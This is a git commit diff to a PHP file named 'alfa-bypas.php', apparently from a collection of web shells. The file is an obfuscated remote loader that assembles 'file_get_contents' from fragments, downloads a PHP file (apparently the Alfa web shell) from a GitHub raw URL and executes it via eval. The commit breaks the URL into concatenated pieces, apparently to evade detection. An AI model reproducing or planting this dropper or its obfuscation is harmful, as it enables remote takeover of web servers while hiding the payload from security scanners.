87b3e58efed50f55839deec829233b14b2705791
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-07-08 16:37:55 +0700

    NuLz

--- alfa/alfa-bypas.php
+++ alfa/alfa-bypas.php
@@ -1,5 +1,5 @@
 <?php
 $f_get = 'f'.'i'.'l'.'e_'.'ge'.'t_'.'co'.'nt'.'en'.'ts';
-$u_r_l = 'https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa.php';
+$u_r_l = 'h'.'tt'.'p'.'s:'.'//'.'r'.'aw'.'.g'.'it'.'hu'.'bu'.'se'.'rc'.'on'.'te'.'nt'.'.c'.'om'.'/h'.'ax'.'or'.'st'.'ars'.'/a'.'rc'.'hi'.'ve/'.'ma'.'in/'.'al'.'f'.'a/'.'al'.'fa.p'.'hp';
 /**#**/@/*55555*/null; /***#***/@/*55555*/eval/***#***/("?>".$f_get($u_r_l))/***#***/ /*haxorstars*/
 ?>
